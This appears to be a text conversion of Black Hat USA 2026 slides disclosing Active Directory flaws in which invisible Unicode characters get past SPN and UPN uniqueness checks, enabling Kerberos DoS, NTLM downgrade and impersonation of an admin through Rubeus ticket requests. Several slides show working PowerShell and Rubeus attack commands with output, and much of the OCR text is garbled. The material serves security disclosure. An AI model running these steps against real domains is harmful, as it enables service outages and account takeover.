---
title: "Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover"
speakers: ["Shai Laron"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf"
pages: 83
sha256: "bfc109e25c55c8d7b72a559ceee8a62fee742f0fee6ceb6b4243348be912e326"
text_chars: 34630
ocr_pages: 36
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:16:01Z"
---
# Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover

**Speakers:** Shai Laron  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf` (83 pages)

## Slide 1

IDENTITY CRISIS Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover

## Slide 2

### Shai Laron | @shailaron

•Security Researcher @ •Specializing in Identity & Kerberos •Like seeing how logical systems can break

## Slide 3

### AGENDA

•Background

•Unicode & LDAP problems •Thinking outside the box

•CVE #1: various impacts

•CVE #2: instant Domain Admin!

## Slide 4

### BACKGROUND

•Active Directory accepts some Unicode characters that are parsed in a non-visible way in ASCII •This allows creating seemingly duplicate users, which Active Directory **doesn’t** normally allow

## Slide 5

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A) Administrator: Windows PowerShell
PS C: \Users\Administrator> New-ADUser “Uniguelser™
New-ADUser : The specified account already exists
At line:1 char:1
4+ New-ADUser -Name “UniqueUser"
Rarer rrr PP
+ CategoryInto N=UniqueUser,CN=Users,DC=d61,DC=lab:String) [New-ADUser], ADIdentity
+ Fully ‘Qualif iedErrorid ver:1316,Microsoft .ActiveDirectory.Management .Commands .NewADUser
PS C:\Users\Administrator> New-ADUser ("Unique" [char]: :ConvertFromUtf32([int]"@x2@0B") "User”)
DistinguishedName : CN=UniqueU ser,CN=Users ,DC=d01,DC=lab
Enabled : False =
GivenName : | .
Name : UniqueU ser a. UniqueUser User
objectClass : user ! .
bjectGuID | -C6239c9a-£286-4a8b-bed2-d71bcd2fcbaa 2. UniqueUser User
SamAccountName :]Uniquel ser | <—— —
SID > S-1-5-271- 27754163148 - 3486865063 -3895145279-18638
Surname :
UserPrincipalName
black hat
2026
```

## Slide 6

### THE SCRIPT

Search-StringInAD.ps1

- Create a dictionary of 29 “invisible” characters

- Get all properties of all objects in the domain (WhenCreated=*)

- Iterate through each attribute

- Convert the attribute to an array of characters

- Retrieve the Hex value of each character, and compare it against the dictionary

## Slide 7

### I WANT TO KNOW

•Are there other “invisible” characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 8

### I WANT TO KNOW

•Are there other “invisible” characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 9

### INITIAL TESTING

**• 0x200B**

**• 0x200C** ✘

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INITIAL TESTING
* 0x200B ¥
PS> New-ADUser
PS> New-ADUser
New-ADUser T
At line:1 char:1
\DUser -Name "“UniqueUser™
ryinfo : ResourceExists: (CN=UniqueUser,CN=Users,DC=De1,DC=lab:5
far
fied account already exists
+ New
) [New-ADUser], ADIdentityAlreadyExistsException
rent .Commands New?
+ Cat
+ FullyQualifiedErrortd : ActiveDirectoryServer:1316,Microsoft .ActiveDirectory.!
“Unique$( [char]: :ConvertFromUtf32( [int ]"@x2@eB"
“Unique$( [char]: :ConvertFromUtf32([int]"6x26ec"
PS> New-ADUser
PS> New-ADUser
ve niqueUser User
New-ADUser : The specified account already exists
At line:1 char:1 ; ; — oy .
+ New-ADUser -Name “Unique${([char]::ConvertFromUtf32([int]"@x20@C"))Use ... ii LJ Agu eLser User
I ResourceExists: (CN=Uniquel ser,CN=Users,DC=De1, t =
+ FullyQualifiederrort d : ActiveDirectoryServer:1316,Microsoft .ActiveDirectory.Management .
readyExistsException
black hat
USA
2026
```

## Slide 10

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a.
Name
@, UniqueUser
#, Uniqueser
#, Uniqueser
@, Uniquelser
@, UniqueUser
@, UniqueUser
@ UniqueUser
#, Uniqueser
#, Uniquelser
@, UniqueUser
@, UniqueUser
#, Uniquelser
#, Uniqueser
black hat
2026
```

## Slide 11

Unicode characters are here ☺

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Name
F.. 0x206CChar--Test
 . 0x206DChar--Test : Unicode characters
F.. Ox206EChar--Test are here ©
2. Ox206F Char--Test
OxE0001Char--Test
F., OxE0020Char--Test
 OxE0021Char--Test
SF, OxE0022Char--Test
,, OxE0023Char--Test
black hat
2026
```

## Slide 12

### I WANT TO KNOW

~~•Are there other~~ “ ~~invisible~~ ” ~~characters in AD?~~ •How could the abuse of these characters be efficiently detected? (Will LDAP work?)

•Do hidden characters have uses apart from persistence?

## Slide 13

USING LDAP

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
USING LDAP
PS> $200B = [char]: :ConvertFromUtf32([int]"@x200B")
PS> Get-ADObject -LDAPFilter "“samaccountnamesUnique$($2@@B )User
DistinguishedName Name
CN=UniqueU ser|,CN=Users ,DC=d6@1,DC=lab UnigueU ser
PS> $2@0C = [char]: :ConvertFromUtf32([int]"@x266C")
PS> Get-ADObject -LDAPFilter “samaccountname=Unique$($2@@C)User
DistinguishedName Name
CN=UniqueUser|, CN=Users , DC=d@1,DC=lab UniqueUser
black hat
@ys4
2026
```

## Slide 14

USING LDAP

## Slide 15

USING LDAP

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
USING LDAP
PS> Get-ADObject -LDAPFilter "samaccountnames@x2@@Cchar--Test|" | select Name, DistinguishedName
\
e@x28@CChar-- Test |CN=@x2@@CChar-- Test ,OU=test,DC=d@1,DC=lab
Name / DistinguishedName
re I
USA
black hat
```

## Slide 16

### INVISIBLE CHARACTER TYPES

•Filterable characters: only 106 out of 385 •Characters treated as whitespaces: *char* returns all object names with spaces (e.g.,  “Domain Admins”, “Print Operators”)

• <u>Characters completely ignored by the DC: *char* returns all objects</u>

## Slide 17

### I WANT TO KNOW

~~•Are there other~~ “ ~~invisible~~ ” ~~characters in AD? •How could the abuse of these characters be efficiently detected? (Will LDAP work?)~~

•Do hidden characters have uses apart from persistence?

## Slide 18

### RECAP

• <u>Active Directory’s LDAP server completely ignores some Unicode characters</u>

**Theory:**

•There may be potential to bypass uniqueness constraints for any Unicode-based attribute.

## Slide 19

### SERVICE PRINCIPAL NAMES

## Slide 20

### SERVICE PRINCIPAL NAMES

TERMSRV/ServerA Service Class Host

Common service classes:

- CIFS - SMB file shares

- HTTP - Web servers

- TERMSRV - Remote Desktop Services

- LDAP

## Slide 21

### SERVICE PRINCIPAL NAMES

•Identity

•Determines the ticket’s encryption key

•Stored in servicePrincipalName •Service == Identity + SPN •Unencrypted in tickets

## Slide 22

### SPN ALIASES

•Forest-wide (Configuration partition) •sPNMappings attribute

## Slide 23

### SPN ALIASES

host=alerter, appmgmt, cisvc, clipsrv, browser, dhcp, dnscache, replicator, eventlog, eventsystem, policyagent, oakley, dmserver, dns, mcsvc, fax, msiserver, ias, messenger, netlogon, netman, netdde, netddedsm, nmagent, plugplay, protectedstorage, rasman, rpclocator, rpc, rpcss, remoteaccess, rsvp, samss, scardsvr, scesrv, seclogon, scm, dcom, **cifs** , spooler, snmp, schedule, tapisrv, trksvr, trkwks, ups, time, wins, www, http, w3svc, iisadmin, msdtcr

## Slide 24

### SPN ALIASES

DC SPN search order:

1. Explicit SPN 2. Only if an explicit SPN is not found, check for aliases

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
SPN ALIASES
DC SPN search order:
1. Explicit SPN
2. Only if an explicit
SPN is not found, check
for aliases
/* First, try to look up the SPN directly. */
rt := LookupAttr(flags, servicePrincipalName, name)
if rt # null then
return rt
endif
/* Obtain SPN mappings value. */
obj := DescendantObject(ConfigNC(),
"CN=Directory Service,CN=Windows NT,CN=Services,")
spnMappings := obj!sPNMappings
if spnMappings # null
mappedSpn := MapSPN(name, spnMappings)
if mappedSpn # null then
/* try to lookup a mapped SPN */
rt := LookupAttr(flags, servicePrincipalName, mappedSpn)
if rt # null then
return rt
ja
USA
black hat
```

## Slide 25

## Slide 26

### PREVIOUS PATCH #1: CVE-2021-42282

Added 3 new uniqueness verification checks: •User Principal Name (UPN) uniqueness •Service Principal Name (SPN) uniqueness •SPN alias uniqueness Enforced by dSHueristics (forest-wide configuration attribute), on by default

## Slide 27

KerberLoss CVE-2026-25177

## Slide 28

KerberLoss: CVE-2026-25177

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
KerberLoss: CVE-2026-251'7'°7
PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA —Pr«
HOST/SERVERA
HOST/ServerA.demo. lab
RestrictedkrbHost/SERVERA
RestrictedKkrbHost/ServerA.demo. lab
TERMSRV/SERVERA
TERMSRV/ServerA.demo. lab
WSMAN/ServerA
WSMAN/ServerA.demo. lab
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB ~Se1
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB
PS C:\Users\Attacker\Desktop>
; serviceprincipalnames).serviceprincipalnames | sort
alNames @{Add="HOST/ServerA"}
alNames @{Add="HOST/S$([char] : :ConvertFromUtf32( [int] "9xE0154"))erverA"}
black hat
USA
2026
```

## Slide 29

KerberLoss: CVE-2026-25177

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
KerberLoss: CVE-2026-251'7'°7
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char] : :ConvertFromUtf32([int]"0xE0154"))erverA"}
PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalnamesHOST/ServerAl | select DistinguishedName
DistinguishedName
CN=SERVERA, CN=Computers , DC=demo , DC=Lab
CN=SERVERB ,, CN=Computers , DC=demo , DC=Lab
—ED 2!
Kerberos needs you to find the differences
between this picture and this picture.
Black hat
```

## Slide 30

OK, SO?

## Slide 31

# SCENARIO #1 Arbitrary DoS to HOST-mapped services

## Slide 32

### DEMO #1 DOS HOST-MAPPED SERVICES FOREST-WIDE

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Em
Recycle Bin ImportantFi...
(SERVERA)
y
Bb
Wireshark
Host Name: HOST2
User Name: ServerAdmin
```

## Slide 33

Attacker User
DC ServerA ServerB
The attacker has
SPN: HOST/ServerA
WriteSPN on ServerB
Users can regularly access files on ServerA
The attacker sets the cifs/ServerA SPN on  ServerB
bypassing uniqueness constraints
SPN:  cifs/ServerA
The user requests a ticket for cifs/ServerA
Q: Who has
cifs/ServerA?
A:  ServerB
Service ticket encrypted with  ServerB's secret key
Access files on ServerA
KRB_AP_ERR_MODIFIED (Wrong key)

## Slide 34

# SCENARIO #2 Simplified SPN-Jacking

## Slide 35

### SPN-jacking

SPN-jacking
Host1
AllowedToDelegateTo = cifs/ServerA
AdminTo
Client:
Administrator
WriteSPN
Server: SPN: host/ServerA
cifs/Server AB ✕
ServerA
WriteSPN
SPN: cifs/ServerA
ServerB

## Slide 36

### SPN-jacking + KerberLoss

Host1
AllowedToDelegateTo = cifs/ServerA
AdminTo
WriteSPN
SPN: host/ServerA
✕
ServerA
WriteSPN
SPN: cifs/ServerA
ServerB

## Slide 37

Demo #2

SIMPLIFIED SPN-jacking

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© B® Administrator: Windows Pow X = + v
PS C:\Users\Attacker\Desktop> hostname
Host1
PS C:\Users\Attacker\Desktop> whoami
demo\attacker
PS C:\Users\Attacker\Desktop> Get-ADUser attacker -Properties memberof,primarygroupid | select Name, MemberOf, primarygroupid
Name MemberOf primarygroupid
attacker {}
PS C:\Users\Attacker\Desktop> (Get-Acl -Path "AD:CN=SERVERB, CN=Computers ,DC=demo,DC=lab").Access | where {$_.IdentityReference -eq "DEMO\attacker"} | select
ActiveDirectoryRights , ObjectType, @{Name='ObjectTypeString' ;Expression={$0bjectTypeHT[$_.ObjectType.Guid]}},ObjectFlags ,AccessControlType, IdentityReference
ActiveDirectoryRights : WriteProperty
ObjectType : £3a64'788-5306-11d1-a9c5-0000f80367c1
ObjectTypeString : Service-Principal-Name
ObjectFlags : ObjectAceTypePresent
AccessControlType : Allow
IdentityReference : DEMO\attacker
PS C:\Users\Attacker\Desktop>
```

## Slide 38

SCENARIO #3 Authentication downgrade of any Kerberos service

## Slide 39

Attacker User
DC ServerA ServerB
The attacker has
SPN: HOST/ServerA
WriteSPN on ServerB
The user can regularly access files on ServerA
The attacker sets the  HOST /ServerA SPN on  ServerB
bypassing uniqueness constraints
SPN:  HOST/ServerA
The user requests a ticket for cifs/ServerA
No cifs SPN found
Q: Who has
HOST/ServerA?
A:  duplicate SPN
KDC_ERR_S_PRINCIPAL_UNKNOWN
Kerberos failed, automatically try NTLM
Seemingly normal access

## Slide 40

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
&
E ame erverAd
ii Capturing from Ethernet0 2 - Oo x
File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help | Ge x i
= © REiteos? SSIS 0008 * G @& > Network »> SERVERA > ImportantFiles
(AU [smb |] kerberos || ntimssp || ws.col.protocol == "SMB2") && !_ws.col.protocol == "BROWSER" || ws.col.protocol == "DCERPC" || ws.col.protocol == "LDAP")) [es vJ+
No. Protocol Info ® new NL Sort = view
298 SMB2 Negotiate Protocol Request au Name . Date modified
299 SMB2 Negotiate Protocol Response ome ops sys
3@3KRBS  AS-REQ i calley _ _
304 KRBS KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED > @ OneDrive
311 KRB5 AS-REQ Shared Documents "
312 KRBS _AS-REP Di ct0ips "
320 KRBS TGS-REQ am Desitop ED passwordst "
322 KRBS TGS-REP % Downlosds = #
327 SMB2 Session Setup Request J Documents #
329 SMB2 Session Setup Response PR Pictures *
330 SMB2 Tree Connect Request, Tree: '\\SERVERA\IPC$' @ Music .
331 SMB2 Tree Connect Response, Tree: '\\SERVERA\IPC$'
332 SMB2 Ioctl Request FSCTL_QUERY_NETWORK_INTERFACE_INFO Ed Videos .
333 SMB2 Ioctl Response FSCTL_QUERY_NETWORK_INTERFACE_INFO
334 SMB2 Ioctl Request FSCTL_DFS_GET_REFERRALS, Path: \SERVERA\ImportantFiles > Gi Thispc
> i Network
tkt-vno: 5 ee 5 |
realm: DEMO.LAB 06 a
¥ sname Ts an
name-type: kRB5-NT-SRV-INST (2) ee Ff
v sname-string: 2 items 06 7
SNameString: cifs 444
SNameString: SERVERA ela
> enc-part 69 6
> enc-part 02 @
rro---~-- Bee AaAAt la 3
QO *F  Ethernet0 2: <live capture in progress> Packets: 4325 - Displayed: 38 (0.9%) Profile: Default
>
Search ImportantF Q
© Preview
Select a file to preview
in
```

## Slide 41

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© B® Administrator: Windows Pow X
ActiveDirectoryRights : WriteProperty
ObjectType : £3a64788-5306-11d1-a9c5-0000f80367c1
ObjectTypeString : Service-Principal-Name
ObjectFlags : ObjectAceTypePresent
AccessControlType : Allow
IdentityReference : DEMO\attacker
PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA -Properties serviceprincipalnames).serviceprincipalnames | sort
HOST/SERVERA
HOST/ServerA.demo. lab
RestrictedkrbHost/SERVERA
RestrictedkrbHost/ServerA.demo. lab
TERMSRV/SERVERA
TERMSRV/ServerA.demo. lab
WSMAN/ServerA
WSMAN/ServerA.demo. lab
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide
At lLine:1 char:1
+ Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/ServerA"}
+ CategoryInfo : NotSpecified: (ServerB:ADComputer) [Set-ADComputer], ADException
+ FullyQualifiedErrorId : ActiveDirectoryServer: 8647 ,Microsoft.ActiveDirectory.Management .Commands.SetADComputer
PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char] : :ConvertFromUtf32([int]"0xE0154"))erverA"}
SioSt/Serversy
PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalname ' | select DistinguishedName
DistinguishedName
ICN=SERVERA , CN=Computers , DC=demo , DC=Lab
ICN=SERVERB , CN=Computers , DC=demo , DC=Lab
PS C:\Users\Attacker\Desktop> |
```

## Slide 42

Kerberos ✘ NTLM

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
&
= ame erverAd
— ImportantFiles
a48c® RE Se2=S7FF$LT2baQqanth a
[0 [smb |] kerberos || ntimssp || ws.col.protocol == "SMB2") && !_ws.col.protocol == "BROWSER" || ws.col.protocol == "DCERPC" || ws.col.protocol == "LDAP")) [sa -)+
No. Protocol Info @® new
182 SMB2 Negotiate Protocol Response a
195 KRBS AS-REQ Home
196 KRB5S KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED Ay Gallery
204 KRBS AS-REQ > @ OneDrive
207 KRB5S AS-REP
215 KRB5S TGS-REQ K b 4
217 KRBS KRB Error: KRB5KDC_ERR_S PRINCIPAL_UNKNOWN er €ros Deiter .
222 SMB2 Session Setup Request, NTLMSSP_NEGOTIATE ~ Downloads = #
223 SMB2 Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, N1 J Documents #
225 SMB2 Session Setup Request, NTLMSSP_AUTH, User: DEMO\ServerAdmin PR Pictures *
228 SMB2 Session Setup Response @ Music .
229 SMB2 Tree Connect Request, Tree: '\\SERVERA\IPC$'
230 SMB2 Tree Connect Response, Tree: '\\SERVERA\IPC$' Ed Videos ,
231 SMB2 Ioctl Request FSCTL_QUERY_NETWORK_INTERFACE_INFO
232 SMB2 Ioctl Response FSCTL_QUERY_NETWORK_INTERFACE_INFO > GB This ec
> Hi Network
> Frame 229: Packet, 158 bytes on wire (12 @@ 5@ 56 9c e1 ed 08 50 56 9c cb
> Internet Protocol Version 4, Src: 192.16 @@ 34 ed 9a @1 bd 1d 8b e8 O2 ce s items
> Transmission Control Protocol, Src Port:
>» NetBIOS Session Service
>» SMB2 (Server Message Block Protocol vers
O 7  KerberLoss_downgrade,pcapng Packets: 7321 - Displayed: 39 (0.5%) Profile: Default
Ht | Q Search
x +
G @& > Network »> SERVERA > ImportantFiles
TW Sort = view
Name Date modified
Apps 11/03/20.
IT 11/03,
Shared Documents nN
0) ce0jpg "1
|| passwords.tt 11.
Luema
>
Search ImportantF Q
© Preview
Select a file to preview
Ill
in
```

## Slide 43

### KerberLoss: CVE-2026-25177

Without any permissions on the target: •DOS of any HOST-mapped service in the forest •Force any service in the forest, HOST-mapped or not, to use only NTLM

•Delegation scenarios

## Slide 44

### PREVIOUS PATCH #1: CVE-2021-42282

Added 3 new uniqueness verification checks: •User Principal Name (UPN) uniqueness •Service Principal Name (SPN) uniqueness •SPN alias uniqueness Enforced by dSHueristics (forest-wide configuration attribute), on by default

## Slide 45

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin> Get-ADUser DemoAdmin1 | select DistinguishedName, SamAccountName, UserPrincipalName
IDDistinguishedName SamAccountName UserPrincipalName
ICN=DemoAdmin1 , OU=Admin , DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName “DemoAdmini@demo. lab"
ISet-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
4+ Set-ADUser UPNUser -UserPrincipalName "DemoAdmini@demo.lab"
+
+ CategoryInfo : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
+ FullyQualifiedErrorId : ActiveDirectoryServer :8648,Microsoft.ActiveDirectory .Management .Commands .SetADUser
PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName "Demo$( [char]: :ConvertFromUtf32( [int ]"9@xE@154") )Admini@demo. lab"
PS C:\Users\notadmin> Get-ADObject -LDAPFilter “userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName
[DDistinguishedName SamAccountName UserPrincipalName
ICN=DemoAdmin1 , OU=Admin, DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser Demo Admini@demo.lab
black hat
USA
2026
```

## Slide 46

KERBEROS NAME TYPES

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
KERBEROS NAME TYPES
Realm = KerberosString
PrincipalName ::= SEQUENCE {
name-type fe] Int32,
name-string [1] SEQUENCE OF KerberosString
}
black hat
2026
```

## Slide 47

### KERBEROS NAME TYPES

|**Name Type**|**Value**|**Meaning**|
|---|---|---|
|**NT-UNKNOWN**|**0**|**Name type not known**|
|NT-PRINCIPAL
**NT-PRINCIPAL**|1
**1**|"Just the name of the principal" (SamAccountName)
**"Just the name of the principal" (SamAccountName)**|
|**NT-SRV-INST**|**2**|**Service and other unique instance (krbtgt)**|
|**NT-SRV-HST**|**3**|**Service with host name as instance (telnet, rcommands)**|
|**NT-SRV-XHST**|**4**|**Service with host as remaining components**|
|**NT-UID**|**5**|**Unique ID**|
|**NT-X500-**
**PRINCIPAL**|**6**|**Encoded X.509 Distinguished name [RFC2253]**|
|**NT-SMTP-NAME**|**7**|**Name in form of SMTP email name (e.g.,**
**user@example.com)**|
|**NT-ENTERPRISE**
**NT-ENTERPRISE**|**10**
**10**|**Enterprise name (UserPrincipalName)**
**Enterprise name (UserPrincipalName)**|

## Slide 48

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "“userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName
DistinguishedName SamAccountName UserPrincipalName
ICN=DemoAdmin1, OU=Admin, DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser Demo Admini@demo.lab
PS C:\Users\notadmin\Desktop> $upn = “Demo$( [char]: :ConvertFromUtf32([int]"@xE0154") )Admini@demo.lab"
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype: enterprise
1 vPtt] -\PL 111 Iz)
IL} I_l-_/|__/|} ) /(__/
v2.3.3
[*] Action: Ask TGT
[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88057E@6A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: 'demo.lab\Demo Admini@demo.lab'
[*] Using domain controller: 192.168.0.11:88
[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED:
black hat
USA
2026
```

## Slide 49

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "“userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName
DistinguishedName SamAccountName UserPrincipalName
CN=UPNUser, Ci=Users ,DC=demo,DC=lab UPNUser Demo Admini@demo. lab
PS C:\Users\notadmin\Desktop> $upn = “Demo$([char]::ConvertFromUtf32([int]"@xE@154"))Admini@demo. lab”
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype:enterprise
Servicelame : krbtgt/demo.lab
ServiceRealm : DEMO.LAB
UserName : |Demo Admini@demo.lab (NT_ENTERPRISE)
UserRealm : DEMO.LAB
StartTime > #£/5/2026 6:24:19 AM
EndTime > 7/5/2026 6:24:19 PM
RenewTill > 7/12/2026 8:24:19 AM
Flags : mame _canonicalize, pre_authent, initial, renewable, forwardable
KeyType > aes256 cts hmac_shal
Baseb4(key) > W8sCfFPyTHXJVis9reBSVMIDPFV6t1 /Sxavsekcr1rdy=
ASREP (key) : 64F12CDDAA83057EQ6A81B54E73B949B
black hat
©2845
```

## Slide 50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmini@demo.lab"
ISet-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
+ Set-ADUser UPNUser -UserPrincipalName "DemoAdmini@demo. lab"
7s
+ CategoryInfo : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
+ FullyQualifiedErrorId : ActiveDirectoryServer :8648,Microsoft.ActiveDirectory .Management .Commands .SetADUser
PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmini"
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter |"userprincipalname=DemoAdmin1*"| -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName
IDistinguishedName SamAccountName UserPrincipalName
ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser DemoAdmin1
ICN=DemoAdmin1 , OU=Admin , DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo.1lab
black hat
USA
2026
```

## Slide 51

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt|/user:DemoAdminl /password: Password]
—J) Ile _
f_ vlll tl -W—_ TIT i)
Ih AMILITIO) ILI Let
I J_I__/l__/] ) /C_/
v2.3.3
[*] Action: Ask TGT
[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88@57E@6A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: ‘demo.lab\DemoAdmin1'
[*] Using domain controller: 192.168.0.11:88
[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_ FAILED:
/nowrap /suppenctype:AES256
black hat
©2845
```

## Slide 52

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt |/user:DemoAdmin1 /password:Password1|/nowrap /suppenctype:AES256 |/principaltype: enterprise
[*] Action: Ask TGT
[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88057E@6A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: ‘demo. lab\DemoAdmin1'
[*] Using domain controller: 192.168.0.11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
~ encTicketPart
doIFTjCCBUqgAwI BBaEDAgEWoo IEXTCCBF 1lhggRVMI IEUaADAgEF oQobCERFTU8uT EFCoh@wG6ADAgECoRQwEhsGa3J Paddi ng: @
NOUCMBTxwTtCvJksLphqJKWaRM2oSqgMdbZauGb32vXmcgE19X0I9tpmWvgQawqPwHY14vg7YuDzSakUyoah/AkTK3BTfC1Tc
KZfY7t/ahTSo6pusJxFxR/8qtStOAbpypxA4b9v+i5IW1dKh7yrzvwd/fhmQq4d2NmoGC416q@dpzanJs-jma/mItDpFA6uST4: flags: 40e10000
[TbrBA1+E7wBOV9uX6j OhxAwnwPPgl 9H+KdCjUZICAFs6iST++sDa8ji TvFROpFAcTUJikwQ7XvuCVhEZdZXEunJUyexMf839M4 key
izshXSpP+SmthgwlO1YDKV1x@vKHvR8bMj zp6ro8CtMDIAQ1B11hcHD8p4bH46VmsiBStexit3opmIFyt9HXZz1AnA/y7Sx5LI crealm: DEMO.LAB
GPsRm034xJzSQ8KaSLky+XNSUaJCwJ6CI zbqxLBUcGkQMaE9 FvzcIxSRQm3bQqQhmuApLGkr4DgC3LMYt2/ibPFQHagFully@py
NetSDt1VozIFRCE@ezPVCuAxYGIJ FOew LRYs JATCTxS3B31uDUG1T rXqlirgMG+eeqRUn2Fhw+SwBQxOmnl/YtrnjUe91cK209 ¥ cname
DszNPSSDqStFDvkrFht5SbH@j8Mj2TKdh8@5BM4j F8c/QhnWUF8QzcSbGU+hNamkwVqkYOunAIGON4EdExsK/P/URtQI1Y9Nzjq name- type : kRBS-NT-ENTERPRISE-PRINCIPAL ( 10 ) j
lY JRcqDTCO3TGnh6gsbp8FOy5sKPOkCht82Vqg8FB2wHdtmZQXWBHCVbHCTY4DeX/FVSZocyCJGBx14n/EfgCcjcWCpdTIIzoEZI
2ByzCByKCBxTCBwjCBv6ArMCmgAwIBEqEiBCBy9SZdBNMt4pzxws11QaKOyrpQp01FtCSWTFCRFUFx0aEKGwhERUIPLkxBQqI » cname-string: 1 item
wij YwNzA2MTkIMDMSWqcRGA8yMDI2MDcxMzASNTAZOVqoChs IREVNTySMQUKpHTAboAMCAQKhFDASGwZrcmJ@Z3QbCGR1bWS CNameSt ring : DemoAdmin1
ServiceName : krbtgt/demo. lab
ServiceRealm : DEMO. LAB . d =
[UserName :_DemoAdmind (NT_ENTERPRISE) -}———| UserName ’ DemoA minl (NT_ENTE RPRISE )
UserRealm : DEMO.LAB
StartTime : 7/6/2026 2:50:39 AM
EndTime : 7/6/2026 12:50:39 PM
RenewTill : 7/13/2026 2:50:39 AM
Flags : mame_canonicalize, pre_authent, initial, renewable, forwardable
KeyType : aes256_cts_hmac_shal
Base64(key) > cvUmXQTTLeKc8cLNdUGij sq6UKdNRbQuVkxQkRVH8Tk=
